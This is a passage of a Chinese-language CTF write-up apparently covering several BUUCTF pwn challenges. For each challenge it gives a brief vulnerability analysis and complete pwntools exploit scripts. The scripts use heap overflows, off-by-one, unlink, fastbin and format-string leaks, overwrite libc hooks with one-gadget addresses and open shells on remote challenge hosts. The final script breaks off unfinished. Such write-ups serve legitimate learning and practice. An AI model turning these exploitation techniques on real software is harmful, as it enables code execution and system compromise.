    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size'</span>,str(size))
    sa(<span class="hljs-string">'Content'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)
add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)
free(<span class="hljs-number">0</span>)
free(<span class="hljs-number">1</span>)
add(<span class="hljs-number">8</span>,p32(<span class="hljs-number">0x0804862B</span>) + p32(elf.got[<span class="hljs-string">'__libc_start_main'</span>]))
show(<span class="hljs-number">0</span>)
r()
libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x18540</span>
info_addr(<span class="hljs-string">'base'</span>,libc_base)
free(<span class="hljs-number">2</span>)
system = <span class="hljs-number">0x0003ada0</span> + libc_base
add(<span class="hljs-number">8</span>,p32(system) + <span class="hljs-string">'||sh'</span>)
show(<span class="hljs-number">0</span>)
itr()</code></pre></div>

<p>Buu远程打不通。。</p>
<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>Edit函数处，故意可以多写出一个字节。</p>
<ul>
<li>off by one</li>
</ul>
<h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./heapcreator'</span>
context.log_level = <span class="hljs-string">'debug'</span>
elf = ELF(local_file)
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26646</span>)
    libc = elf.libc
    <span class="hljs-comment"># remote_libc = '.' # './libc.so.6'</span>
    <span class="hljs-comment"># libc = ELF(remote_libc)</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'Heap'</span>,str(size))
    sa(<span class="hljs-string">'heap'</span>,str(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sa(<span class="hljs-string">'heap'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))


add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'\x00'</span>)
add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)
add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'cccc'</span>)
add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'dddd'</span>)
payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">'a'</span> + <span class="hljs-string">'\xa1'</span>
edit(<span class="hljs-number">0</span>,payload)
free(<span class="hljs-number">1</span>)
add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'\x78'</span>)
show(<span class="hljs-number">1</span>)
ru(<span class="hljs-string">'Content : '</span>)
base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>
info_addr(<span class="hljs-string">'libc_base'</span>,base)
free(<span class="hljs-number">1</span>)
free_hook = <span class="hljs-number">0x3c67a8</span> + base
paylaod = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">2</span> * <span class="hljs-number">8</span>  + p64(<span class="hljs-number">8</span>) + p64(free_hook)
add(<span class="hljs-number">0x30</span>,paylaod)
rce = base + rce16[<span class="hljs-number">1</span>]
edit(<span class="hljs-number">2</span>,p64(rce))
free(<span class="hljs-number">0</span>)
itr()</code></pre></div>

<h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>保护全开，程序逆向起来看起来很乱，并且堆块定位是通过栈来传参，没有全局指针。</p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>calloc 函数基本跟malloc一样，但是再分配好堆块时，会把分配到的堆块全部清理为0。</p>
<h5 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h5><p>无法通过传统的unsortbin来leak libc，结合fill函数中的堆溢出即可。</p>
<h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>Fill 函数中，明显有堆溢出，且十分好用，效果很大。</p>
<h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./0ctf_2017_babyheap'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26374</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>
    sla(<span class="hljs-string">'Command'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'Size'</span>,str(size))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(idx,size,data)</span>:</span>
    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sla(<span class="hljs-string">'ize'</span>,str(size))
    sa(<span class="hljs-string">'tent'</span>,str(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>
add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#1</span>
add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#2</span>
add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#3</span>
add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#4</span>
add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#5</span>
payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>
fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,payload)
free(<span class="hljs-number">1</span>)
add(<span class="hljs-number">0x30</span>)
dump(<span class="hljs-number">2</span>)
ru(<span class="hljs-string">'Content: \n'</span>)
base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>
info_addr(<span class="hljs-string">'libc_base'</span>,base)
add(<span class="hljs-number">0x50</span>) <span class="hljs-comment">#6</span>
add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>
add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">8</span>)
malloc_hook = base + <span class="hljs-number">0x3c4b10</span>
payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">13</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook<span class="hljs-number">-0x23</span>) 
fill(<span class="hljs-number">5</span>,len(payload),payload)
add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>
add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>
rec = rce16[<span class="hljs-number">1</span>] + base
payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x13</span> + p64(rec)
fill(<span class="hljs-number">8</span>,len(payload),payload)
add(<span class="hljs-number">0x20</span>)
itr()</code></pre></div>

<h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><div class="hljs"><pre><code class="hljs c">close(<span class="hljs-number">1</span>);
close(<span class="hljs-number">2</span>);
<span class="hljs-keyword">return</span> shell();</code></pre></div>

<p>直接就给你shell了，但是stdout已经被关闭了。但是对其文件描述符<code>1</code>进行重定向为没有关闭的<code>0</code>即可。</p>
<div class="hljs"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> 1&gt;&amp;0 &amp;&amp; cat flag</code></pre></div>

<h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">ssize_t</span> vulnerable()
&#123;
  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>

  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x24</span>u);
&#125;</code></pre></div>

<p>明显可以看出只可以控制2个gadget。优先想到了栈迁移。可是也没有合适地方去迁移利用。</p>
<p>倘若可以控制3个gadget，直接：</p>
<div class="hljs"><pre><code class="hljs c">p32(system.plt) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(sh)</code></pre></div>

<p>这样就可以拿到shell了。</p>
<p>因为平时rop时，32位下自己<strong>十分</strong>经常**用<code>函数的plt+返回地址+参数1</code>，造成思路卡顿。</p>
<h4 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h4><p>但是尝试去看下后门函数：</p>
<div class="hljs"><pre><code class="hljs c">.text:<span class="hljs-number">08048521</span> ; <span class="hljs-number">2</span>:   <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>);
.text:<span class="hljs-number">08048521</span>                 sub     esp, <span class="hljs-number">0</span>Ch
.text:<span class="hljs-number">08048524</span>                 push    offset command  ; <span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>
.text:<span class="hljs-number">08048529</span>                 call    _system
.text:<span class="hljs-number">0804852</span>E                 add     esp, <span class="hljs-number">10</span>h
.text:<span class="hljs-number">08048531</span>                 nop
.text:<span class="hljs-number">08048532</span>                 leave
.text:<span class="hljs-number">08048533</span>                 retn</code></pre></div>

<p>在08048524处，可以看到起其call system前，<code>push    offset command</code>，把这个字符串压栈，来作为第一个参数。</p>
<p> 那就在溢出时，返回地址填上<code>08048529</code> ，在自己填上sh的地址即可了。</p>
<p>这样就在call system时，完成的是<code>system(sh)</code>。</p>
<p>其实也是很简单的：</p>
<p>由于<code>因为平时rop时，32位下自己经常用`函数的plt+返回地址+参数1`，造成思路卡顿。</code> ，其实自己分析以后就是：<code>函数的plt+4字节+参数1</code>。</p>
<p>溢出时，填上<code>p32(0x8048529) + p32(sh)</code><br>栈信息：</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-tag">0000</span>| <span class="hljs-selector-tag">0xffcca2fc</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048529</span> (&lt;shell+<span class="hljs-number">14</span>&gt;:     call   <span class="hljs-number">0</span>x80483e0 &lt;system<span class="hljs-variable">@plt</span>&gt;)
<span class="hljs-selector-tag">0004</span>| <span class="hljs-selector-tag">0xffcca300</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048670</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div>

<p>在溢出调用时,ret到：</p>
<div class="hljs"><pre><code class="hljs undefined">.<span class="hljs-built_in">text</span>:<span class="hljs-number">08048529</span>                 <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span></code></pre></div>

<p>其就是</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">push</span> <span class="hljs-built_in">eip</span>+<span class="hljs-number">4</span>
<span class="hljs-keyword">jmp</span> system.plt</code></pre></div>

<p>然后栈就变成了：</p>
<div class="hljs"><pre><code class="hljs undefined">=&gt; <span class="hljs-number">0x80483e0</span> &lt;<span class="hljs-symbol">system@</span>plt&gt;:      jmp    DWORD PTR ds:<span class="hljs-number">0x804a018</span>
 | <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:    push   <span class="hljs-number">0x18</span>
 | <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:   jmp    <span class="hljs-number">0x80483a0</span>
 | <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:   jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span>
 | <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;: push   <span class="hljs-number">0x20</span>
 |-&gt;   <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:        push   <span class="hljs-number">0x18</span>
       <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:       jmp    <span class="hljs-number">0x80483a0</span>
       <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:       jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span>
       <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;:     push   <span class="hljs-number">0x20</span>
                                                                  JUMP <span class="hljs-keyword">is</span> taken
[------------------------------------stack-------------------------------------]
<span class="hljs-number">0000</span>| <span class="hljs-number">0xffcca2fc</span> --&gt; <span class="hljs-number">0x804852e</span> (&lt;shell+<span class="hljs-number">19</span>&gt;:     add    esp,<span class="hljs-number">0x10</span>)
<span class="hljs-number">0004</span>| <span class="hljs-number">0xffcca300</span> --&gt; <span class="hljs-number">0x8048670</span> --&gt; <span class="hljs-number">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div>

<p>这就变成了，自己熟悉的<code>函数的plt+返回地址+参数1</code></p>
<h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn <span class="hljs-built_in">import</span> *
<span class="hljs-built_in">import</span> time
<span class="hljs-attr">local_file</span>  = './wustctf2020_getshell_2'
<span class="hljs-attr">elf</span> = ELF(local_file)
context.<span class="hljs-attr">log_level</span> = 'debug'
<span class="hljs-attr">debug</span> = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    <span class="hljs-attr">io</span> = process(local_file)
    <span class="hljs-attr">libc</span> = elf.libc
<span class="hljs-keyword">else</span>:
    <span class="hljs-attr">io</span> = remote('node3.buuoj.cn',<span class="hljs-number">25032</span>)
    <span class="hljs-attr">libc</span> = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.<span class="hljs-attr">arch</span> = elf.arch
context.<span class="hljs-attr">terminal</span> = ['tmux','neww']

<span class="hljs-attr">offset</span> = <span class="hljs-number">28</span>
<span class="hljs-attr">sh</span> = elf.search('sh\x00').next()
<span class="hljs-attr">system</span> = <span class="hljs-number">0</span>x8048529
<span class="hljs-attr">payload</span> = 'a' * offset + p32(system) + p32(sh)
s(payload)
itr()</code></pre></div>

<h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>保护全开。</p>
<h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul>
<li>格式化字符串漏洞，可以泄漏出程序和libc的基址</li>
<li>edit函数中，错误的size选取，导致每次可以多溢出0x10的字节，威力就很大了，prev size与 size都可以改到。</li>
</ul>
<p>直接进行unlink攻击即可。估计就是考这个的，程序限制了不能申请0x80以下的堆块，且key值基本没办法改到。</p>
<h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./axb_2019_heap'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26837</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'(0-10)'</span>,str(idx))
    sla(<span class="hljs-string">'size'</span>,str(size))
    sla(<span class="hljs-string">'content'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sla(<span class="hljs-string">'content'</span>,str(data))

payload = <span class="hljs-string">'%15$p'</span> + <span class="hljs-string">'%11$p'</span>

sla(<span class="hljs-string">'name'</span>,payload)
ru(<span class="hljs-string">'Hello, 0x'</span>)
libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x20830</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
ru(<span class="hljs-string">'0x'</span>)
bin_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x1186</span>
info_addr(<span class="hljs-string">'bin_base'</span>,bin_base)

note = bin_base + <span class="hljs-number">0x202060</span>
key = bin_base + <span class="hljs-number">0x202040</span>

add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)
payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)
payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)
edit(<span class="hljs-number">0</span>,payload)
free(<span class="hljs-number">1</span>)
free_hook = <span class="hljs-number">0x3c67a8</span> + libc_base
payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(free_hook) + p64(<span class="hljs-number">0x88</span>)
edit(<span class="hljs-number">0</span>,payload)
rec = rce16[<span class="hljs-number">1</span>] + libc_base
edit(<span class="hljs-number">0</span>,p64(rec))
free(<span class="hljs-number">2</span>)
itr()</code></pre></div>

<h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>Edit函数中，有个大威力的堆溢出。<br>用unlink攻击。</p>
<h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./bamboobox'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26818</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'len'</span>,str(size))
    sa(<span class="hljs-string">'name'</span>,str(data))
